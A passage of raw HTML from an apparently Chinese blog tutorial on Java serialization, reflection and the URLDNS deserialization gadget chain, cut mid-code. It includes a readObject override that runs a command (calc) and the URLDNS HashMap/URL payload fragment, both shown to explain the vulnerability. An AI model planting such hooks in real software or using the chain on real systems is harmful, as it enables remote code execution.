class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token keyword\">float</span> ft <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">float</span><span class=\"token punctuation\">)</span>cap <span class=\"token operator\">*</span> lf<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            threshold <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>cap <span class=\"token operator\">&lt;</span> <span class=\"token constant\">MAXIMUM_CAPACITY</span> <span class=\"token operator\">&amp;&amp;</span> ft <span class=\"token operator\">&lt;</span> <span class=\"token constant\">MAXIMUM_CAPACITY</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                         <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>ft <span class=\"token operator\">:</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token constant\">MAX_VALUE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token comment\">// Check Map.Entry[].class since it's the nearest public type to</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token comment\">// what we're actually creating.</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token class-name\">SharedSecrets</span><span class=\"token punctuation\">.</span><span class=\"token function\">getJavaObjectInputStreamAccess</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">checkArray</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Map<span class=\"token punctuation\">.</span>Entry</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> cap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token annotation punctuation\">@SuppressWarnings</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"rawtypes\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"unchecked\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token class-name\">Node</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">V</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> tab <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Node</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">V</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Node</span><span class=\"token punctuation\">[</span>cap<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            table <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token comment\">// Read the keys and values, and put the mappings in the HashMap</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> mappings<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                <span class=\"token annotation punctuation\">@SuppressWarnings</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unchecked\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>                    <span class=\"token class-name\">K</span> key <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">)</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                <span class=\"token annotation punctuation\">@SuppressWarnings</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unchecked\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                    <span class=\"token class-name\">V</span> value <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">V</span><span class=\"token punctuation\">)</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                <span class=\"token function\">putVal</span><span class=\"token punctuation\">(</span><span class=\"token function\">hash</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>Java 序列化就是将 java 对象转换成字节序列（二进制，写文件）的过程；</p>\n<p>java 反序列化是指将字节序列（通过读文件的方式）恢复为 Java 对象的过程；</p>\n<h2 id=\"常见协议\"><a class=\"anchor\" href=\"#常见协议\">#</a> 常见协议：</h2>\n<p>java 序列化对应的传输协议：</p>\n<ul>\n<li>\n<p>XML&amp;SOAP</p>\n</li>\n<li>\n<p>XML 是一种常用的序列化和反序列化协议，具有跨机器，跨语言等优点，SOAP（Simple Object Access protocol） 是一种被广泛应用的，基于 XML 为序列化和反序列化协议的结构化消息传递协议</p>\n</li>\n<li>\n<p>JSON（Javascript Object Notation）</p>\n</li>\n<li>\n<p>Protobuf</p>\n<h3 id=\"serializable序列化接口接口\"><a class=\"anchor\" href=\"#serializable序列化接口接口\">#</a> serializable (序列化接口) 接口：</h3>\n<pre><code>public interface Serializable&#123;\n&#125;\n</code></pre>\n<p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>对象必须添加 Serializable 这个接口，才能序列化为字节。这个用来表示这个类可以被 ObjectOutputStream 序列化，以及被 ObjectlnputStream 反序列化</p>\n<p>通过 ObjectOutputStream 将需要序列化数据写入到流中，因为 Java IO 是一种装饰者模式，因此可以通过 ObjectOutStream 包装 FileOutStream 将数据写入到文件中或者包装 ByteArrayOutStream 将数据写入到内存中。同理，可以通过 ObjectInputStream 将数据从磁盘 FileInputStream 或者内存 ByteArrayInputStream 读取出来然后转化为指定的对象即可。</p>\n</li>\n<li></li>\n</ul>\n<p>序列化是将一个对象序列化为二进制文件，保存起来，用的方法是 writeObject (序列化对象)</p>\n<p>反序列化是将一个二进制文件转换为一个对象，需要读取文件，用的方法就是 readObject (反序列化成对象)</p>\n<p>具体的例子就不举了</p>\n<h3 id=\"文件操作流\"><a class=\"anchor\" href=\"#文件操作流\">#</a> 文件操作流：</h3>\n<h4 id=\"objectoutputstream\"><a class=\"anchor\" href=\"#objectoutputstream\">#</a> ObjectOutputStream：</h4>\n<p>代表对象输出流：</p>\n<p>它的 writeObject (Object obj) 方法可对参数指定的 obj 对象进行序列化，把得到的字节序列写到一个目标输出流中。</p>\n<h4 id=\"objectinputstream\"><a class=\"anchor\" href=\"#objectinputstream\">#</a> ObjectInputStream：</h4>\n<p>代表对象输入流：</p>\n<p>它的 readObject () 方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</p>\n<ul>\n<li></li>\n</ul>\n<p>在反序列化时，readObject 方法会自动执行，而这个方法又可以进行重写，如果我在重写的时候写了些危险的代码，而恰好我可以控制这个代码的参数，就会造成任意代码执行</p>\n<pre><code>private void readObject(ObjectInputStream ois) throws IOException,ClassNotFoundException&#123;\n        ois.defaultReadObject();     //执行默认的readObject的方法\n        Runtime.getRuntime().exec(&quot;calc&quot;);  //这是我重写的多出来的部分\n    &#125;\n</code></pre>\n<p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<h3 id=\"正射与反射\"><a class=\"anchor\" href=\"#正射与反射\">#</a> 正射与反射：</h3>\n<ul>\n<li>\n<p>正射是在编写代码是，需要使用一个类时，先了解这个类是做什么的，然后实例化这个类，再进行操作</p>\n</li>\n<li>\n<p>反射就是我们不知道我们要初始化的类对象是什么，就不能用 new 关键字创建对象，那么我们就可以用反射方法</p>\n</li>\n</ul>\n<h3 id=\"反射的使用\"><a class=\"anchor\" href=\"#反射的使用\">#</a> 反射的使用：</h3>\n<p>class 对象的由来：在每个类编译之后都会有一个 class 对象（同名.class 文件）, 所以我们在未实例化的时候反射获取的就是这个的 class 原型</p>\n<p>获取 Class 类对象：</p>\n<p>1.class,forName () 获取 class 类：</p>\n<pre><code>Class a=Class.forname(&quot;MyReflect.Student&quot;);  //引号里面填类所在的包名+类名\n</code></pre>\n<p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>2. 使用类的.class 方法</p>\n<pre><code>Class a =MyReflection.class\n</code></pre>\n<p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>实例化对象：</p>\n<p>法一：通过 Class 中的 newInstence () 方法：</p>\n<pre><code>Class p=Class.forName(&quot;Person&quot;);\nObject p1=p.newInstance();\n//这里也有另一种写法,区别是要进行强制类型转化\nClass p=Class.forName(&quot;Person&quot;);\nPerson p1=(Person)p.newInstance();\n</code></pre>\n<p>法二：通过 Constructor 的 newInstance () 方法：</p>\n<pre><code>Constructor personconstructor = c.getConstructor(String.class,int.class);//获取person里面的构造函数\nPerson p = (Person) personconstructor.newInstance(&quot;abc&quot;,22);\nSystem.out.println(p);\n</code></pre>\n<p>这里我们要注意一个点，先给出 Person 类中的代码：</p>\n<pre><code>import java.io.IOException;\nimport java.io.ObjectInputStream;\nimport java.io.Serializable;\n\npublic class Person implements Serializable &#123;\n    public String name;\n    private int age;\n\n    public Person()&#123;\n\n    &#125;\n    public Person(String name,int age)&#123;\n        this.name= name;\n        this.age=age;\n    &#125;\n    public String toString()&#123;\n        return &quot;Person&#123;&quot; +\n                &quot;name='&quot; + name + '\\'' +\n                &quot;, age=&quot; + age +\n                '&#125;';\n    &#125;\n    private void readObject(ObjectInputStream ois) throws IOException,ClassNotFoundException&#123;\n        ois.defaultReadObject();\n        Runtime.getRuntime().exec(&quot;calc&quot;);\n    &#125;\n    public void action(String act)&#123;\n        System.out.println(act);\n    &#125;\n&#125;\n</code></pre>\n<p>我们在创建 Class 类对象这里只关注两个地方：</p>\n<pre><code>public Person()&#123;&#125;//无参构造方法\npublic Person(String name,int age)&#123;//含参构造方法\n    this.name= name;\n    this.age=age;\n&#125;\n</code></pre>\n<h3 id=\"获取类的构造器\"><a class=\"anchor\" href=\"#获取类的构造器\">#</a> 获取类的构造器：</h3>\n<p>我们关注上面那段代码中的注释：</p>\n<p>newInstence () 对应的方法其实就是无参数构造器对应的方法，通过无参的构造器来进行实例化，但是如果类中一旦不存在无参构造器就会出现这样的情况:</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/img_convert/26ead18f68f2253a7195670c259e4847.png\" alt=\"img\" /></p>\n<p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" />编辑</p>\n<p>此时第一种方式就行不通了，所以这时候我们就需要第二种方法了，我们首先通过 Class 取到 Person 类的原型以后，通过 Constructor 中的 getConstructor 方法取到 Person 类中含参构造器，然后再设置对应参数类型的原型，所以这里要加上.class，然后通过 newInstance 对类进行实例化时就可以对属性赋值。</p>\n<pre><code>Class c=Class.forName(&quot;Person&quot;);\nConstructor personconstructor = c.getConstructor(String.class,int.class);\nPerson p = (Person) personconstructor.newInstance(&quot;abc&quot;,22);\n</code></pre>\n<h3 id=\"获取类的属性\"><a class=\"anchor\" href=\"#获取类的属性\">#</a> 获取类的属性：</h3>\n<p>法一：通过类的原型获取 public 属性</p>\n<pre><code>getField(String name)\nField f=c.getField(&quot;name&quot;);//括号中对应的参数为属性值\n</code></pre>\n<p>法二：获取类的一个全部类型的属性</p>\n<pre><code>getDeclaredField(String name)\n Field f=c.getDeclaredField(&quot;name&quot;);\n</code></pre>\n<p>当然这里我们也可以通过 setAccessiable 获取私有属性：</p>\n<pre><code>Constructor personconstructor = c.getConstructor(String.class,int.class);//获取person里面的构造函数\nPerson p = (Person) personconstructor.newInstance(&quot;abc&quot;,22);\nSystem.out.println(p);\nField namefield = c.getDeclaredField(&quot;age&quot;);//根据变量名获取\nnamefield.setAccessible(true);//能够访问私有属性\nnamefield.set(p,24);//改变类的对象的值，对应的就是p\nSystem.out.println(p);\n</code></pre>\n<p><img data-src=\"https://i-blog.csdnimg.cn/img_convert/4dd84a11872ac00eee56297b6fa5d9b3.png\" alt=\"img\" /></p>\n<p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" />编辑</p>\n<p>法三：获取类的全部 public 类型的属性</p>\n<pre><code>getFields()\n Field[] f=c.getFields();\n</code></pre>\n<p>法四：获取类的全部类型的属性</p>\n<pre><code>getDeclaredFields()\nField[] personfields = c.getDeclaredFields();\nfor(Field f:personfields)&#123;\n    System.out.println(f);\n&#125;\n</code></pre>\n<h3 id=\"获取类的方法\"><a class=\"anchor\" href=\"#获取类的方法\">#</a> 获取类的方法：</h3>\n<p>法一：获取类的 public 类型方法</p>\n<pre><code>getMethod(String name,class[] parameterTypes)\nMethod actionmethod = c.getMethod(&quot;action&quot;,String.class);//要注意这里有两个参数，后面要传入的是方法形参的类型的原型,无参函数就不用填\n</code></pre>\n<p>法二：获取类的一个特定任一类型的方法</p>\n<pre><code>getDeclaredMethod(String name,class[] parameterTypes)\nMethod actionmethod = c.getDeclaredMethod(&quot;action&quot;,String.class);\nactionmethod.setAccessible(true);\nactionmethod.invoke(p,&quot;asdfasdf&quot;);\n</code></pre>\n<p>法三：获取类的全部 public 的方法</p>\n<pre><code>getMethods()\nClass p=Class.forName(&quot;test.phone&quot;);\nMethod[] m=p.getMethods();\n</code></pre>\n<p>法四：获取类的全部类型的方法</p>\n<pre><code>getDeclaredMethods()\nMethod[] m=p.getDeclaredMethods();\n</code></pre>\n<h2 id=\"直接看urldns审计\"><a class=\"anchor\" href=\"#直接看urldns审计\">#</a> 直接看 URLDNS 审计</h2>\n<p>从 payload 分析</p>\n<pre><code>​```java\nHashMap ht = new HashMap(); // HashMap that will contain the URL\n                URL u = new URL(null, url, handler); // URL to use as the Key\n                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.\n​```\n</code></pre>\n<p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>这里的代码是用来新建哈希图类和 url 类调用 HashMap 的 put 方法，</p>\n<pre><code>​```java\npublic V put(K key, V value) &#123;\n        return putVal(hash(key), key, value, false, true);\n    &#125;\n​```\n</code></pre>\n<p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>这个就是 put 方法</p>\n<p>现在开始就是直接从 HashMap 的 readObject 方法开始</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>```java</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ObjectInputStream</span> s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">ObjectInputStream<span class=\"token punctuation\">.</span>GetField</span> fields <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">readFields</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token comment\">// Read loadFactor (ignore threshold)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">float</span> lf <span class=\"token operator\">=</span> fields<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"loadFactor\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0.75f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>lf <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">Float</span><span class=\"token punctuation\">.</span><span class=\"token function\">isNaN</span><span class=\"token punctuation\">(</span>lf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvalidObjectException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Illegal load factor: \"</span> <span class=\"token operator\">+</span> lf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        lf <span class=\"token operator\">=</span> <span class=\"token class-name\">Math</span><span class=\"token punctuation\">.</span><span class=\"token function\">min</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Math</span><span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.25f</span><span class=\"token punctuation\">,</span> lf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4.0f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token class-name\">HashMap<span class=\"token punctuation\">.</span>UnsafeHolder</span><span class=\"token punctuation\">.</span><span class=\"token function\">putLoadFactor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> lf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token function\">reinitialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        s<span class=\"token punctuation\">.</span><span class=\"token function\">readInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>                <span class=\"token comment\">// Read and ignore number of buckets</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">int</span> mappings <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">readInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Read number of mappings (size)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>mappings <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvalidObjectException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Illegal mappings count: \"</span> <span class=\"token operator\">+</span> mappings<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>mappings <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token comment\">// use defaults</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>mappings <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">float</span> fc <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">float</span><span class=\"token punctuation\">)</span>mappings <span class=\"token operator\">/</span> lf <span class=\"token operator\">+</span> <span class=\"token number\">1.0f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">int</span> cap <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>fc <span class=\"token operator\">&lt;</span> <span class=\"token constant\">DEFAULT_INITIAL_CAPACITY</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                       <span class=\"token constant\">DEFAULT_INITIAL_CAPACITY</span> <span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                       <span class=\"token punctuation\">(</span>fc <span class=\"token operator\">>=</span> <span class=\"token constant\">MAXIMUM_CAPACITY</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                       <span class=\"token constant\">MAXIMUM_CAPACITY</span> <span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                       <span class=\"token function\">tableSizeFor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>fc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            <span class=\"token keyword\">float</span> ft <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">float</span><span class=\"token punctuation\">)</span>cap <span class=\"token operator\">*</span> lf<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            threshold <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>cap <span class=\"token operator\">&lt;</span> <span class=\"token constant\">MAXIMUM_CAPACITY</span> <span class=\"token operator\">&amp;&amp;</span> ft <span class=\"token operator\">&lt;</span> <span class=\"token constant\">MAXIMUM_CAPACITY</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                         <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>ft <span class=\"token operator\">:</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token constant\">MAX_VALUE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token comment\">// Check Map.Entry[].class since it's the nearest public type to</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token comment\">// what we're actually creating.</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token class-name\">SharedSecrets</span><span class=\"token punctuation\">.</span><span class=\"token function\">getJavaObjectInputStreamAccess</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">checkArray</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Map<span class=\"token punctuation\">.</span>Entry</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> cap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token annotation punctuation\">@SuppressWarnings</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"rawtypes\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"unchecked\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token class-name\">Node</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">V</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> tab <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Node</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">V</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Node</span><span class=\"token punctuation\">[</span>cap<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            table <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token comment\">// Read the keys and values, and put the mappings in the HashMap</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> mappings<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>                <span class=\"token annotation punctuation\">@SuppressWarnings</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unchecked\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                    <span class=\"token class-name\">K</span> key <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">)</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                <span class=\"token annotation punctuation\">@SuppressWarnings</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unchecked\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                    <span class=\"token class-name\">V</span> value <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">V</span><span class=\"token punctuation\">)</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>                <span class=\"token function\">putVal</span><span class=\"token punctuation\">(</span><span class=\"token function\">hash</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> value<span 